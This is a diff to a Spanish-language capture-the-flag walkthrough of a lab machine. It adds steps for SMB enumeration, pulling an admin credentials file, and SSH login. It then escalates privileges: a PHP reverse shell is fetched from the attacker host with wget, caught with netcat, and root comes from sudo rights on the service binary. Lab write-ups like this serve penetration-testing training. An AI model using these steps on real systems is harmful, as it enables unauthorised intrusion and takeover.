@@ -33,6 +33,8 @@ Scrolleando se puede identificar 3 campos para ingresar nombre, correo y algún 
 
 <img width="1230" height="621" alt="allien7" src="https://github.com/user-attachments/assets/67eb994b-f23b-4fc9-922b-889f3a31b945" />
 
+## 💣 EXPLOTACIÓN
+
 En este punto, volvemos a la terminal, y vamos a tirar por los puertos de Samba 139 y 445, por lo tanto, vamos a enumerarlos, esto con la herramienta Enum4linux, tirando el comando enum4linux 172.17.0.2, una vez termina el escaneo, vemos que se exponen unas carpetas compartidas, de las cuales solo tenemos lectura y escritura de /myshare
 
 <img width="1177" height="621" alt="allien8" src="https://github.com/user-attachments/assets/2d421079-e5a4-4ce9-80f2-2c218d2ebbf6" />
@@ -61,26 +63,44 @@ Buscaremos en google alguna herramienta de JWT decode para decodear dicho token 
 
 <img width="1281" height="630" alt="allien14" src="https://github.com/user-attachments/assets/62edfc5e-a754-4f35-a0c4-72fed465eb0a" />
 
+Ahora ocuparemos la herramienta smbmap adjuntandole el usuario y la contraseña que encontramos anteriormente, y ahora podemos ver que si tenemos permisos para leer la carpeta /backup24
+
 <img width="1142" height="630" alt="allien15" src="https://github.com/user-attachments/assets/e320be36-bbbc-48f4-bf93-0983cab0f1ef" />
+
+Nos conectamos de la misma manera que a la carpeta anterior con smbclient, y vemos que encontramos un archivo llamado credentials.txt, lo traemos a nuestra máquina atacante y vemos que se expone la credencial del usuario administrador.
 
 <img width="801" height="626" alt="allien16" src="https://github.com/user-attachments/assets/c1067a25-c27e-4de8-b66f-f5c490622c54" />
 
+Nos logueamos vía SSH y ¡Logramos acceso a la máquina víctima!
+
 <img width="731" height="468" alt="allien17" src="https://github.com/user-attachments/assets/3d174017-c5ff-4cee-998c-5d07f02c7a62" />
+
+## 🔑 ESCALADA DE PRIVILEGIOS
+
+En este punto, revisamos permisos de sudoers sin éxito, revisamos binarios SUID sin éxito, leemos directorios típicos sin éxito, por lo tanto, nos quedará pivotar al usuario www-data para ver si él tiene permisos a nivel de sudoers o algo, por lo tanto, se crea un archivo revshell.php que contiene la típica reverse shell de PHP PentestMonkey de la web revshells.com y se levanta un servicio con python3 por el puerto 8080 para mandarlo a la máquina víctima
 
 <img width="737" height="404" alt="allien18" src="https://github.com/user-attachments/assets/f8b2e116-f574-476f-9ec9-ce3f1ba48937" />
 
+Desde la máquina víctima se trae con el comando wget http://10.0.2.15:8080/revshell.php
+
 <img width="1282" height="463" alt="allien19" src="https://github.com/user-attachments/assets/946d887a-8788-4b3d-a04d-3f97d1934699" />
+
+Se mueve al directorio /var/www/html donde está la web del puerto 80.
 
 <img width="606" height="190" alt="allien20" src="https://github.com/user-attachments/assets/ba87ff8b-bcfd-4771-9ad5-779db2966341" />
 
+Y nos pondemos en escucha con la herramienta netcat por el puerto 443, luego en la web se visita la url http://172.17.0.2/revshell.php y se gana acceso nuevamente pero como el usuario www-data.
+
 <img width="1151" height="206" alt="allien21" src="https://github.com/user-attachments/assets/8c5b55a4-8e8c-4fed-8812-0467992a2a98" />
+
+Se revisa con sudo -l permisos a nivel de sudoers y vemos que efectivamente podemos ejecutar el binario /usr/sbin/service
 
 <img width="1143" height="155" alt="allien22" src="https://github.com/user-attachments/assets/2194e549-ac10-4da9-8a51-a2d946dc4e55" />
 
+No dirigiremos a la web de confianza gtfobins.org para filtrar como service y copiar el primer comando que aparezca .
+
 <img width="1178" height="613" alt="allien23" src="https://github.com/user-attachments/assets/990a1ac2-6e4c-4a0d-aced-bcce5026864a" />
 
+Lo lanzamos como el usuario root y listo ¡Somos root!, máquina hackeada . .
+
 <img width="537" height="315" alt="allien24" src="https://github.com/user-attachments/assets/58b697f8-6380-4d0a-ac0b-4dac197ac755" />
-
-## 💣 EXPLOTACIÓN
-
-## 🔑 ESCALADA DE PRIVILEGIOS
